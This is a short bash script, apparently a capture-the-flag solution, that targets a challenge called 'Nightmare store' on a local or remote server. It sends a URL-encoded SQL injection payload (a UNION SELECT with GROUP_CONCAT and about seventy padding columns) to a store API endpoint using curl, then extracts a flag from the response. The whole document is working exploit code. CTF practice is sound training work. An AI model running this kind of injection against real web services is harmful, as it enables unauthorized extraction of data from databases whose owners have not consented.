#!/bin/bash
PORT=8081

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.118:'$PORT
else
    url=$1':'$2
fi

# Nightmare store
echo "Start exploit for Nightmare store"
url=$url"/api/v1.0/storeAPI/'%20UNION%20SELECT%20GROUP_CONCAT(here_man,'-'),\
%202,3,4,5,6,7,8,9,%2010,11,12,13,14,15,16,17,18,19%20,20,21,22,23,24,25,26,27,28,\
29%20,30,31,32,33,34,35,36,37,38,39%20,40,41,42,43,44,45,46,47,48,49%20,50,51,52,53\
,54,55,56,57,58,59%20,60,61,62,63,64,65,66,67,68,69,%2070,%2071%20%20FROM%20%20%20%20\
%20%20check807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87%20--x"
flag=$(curl -s $url | grep -P -o "SSS{.*?}")
echo "Flag is $flag"
echo "----------------------------"
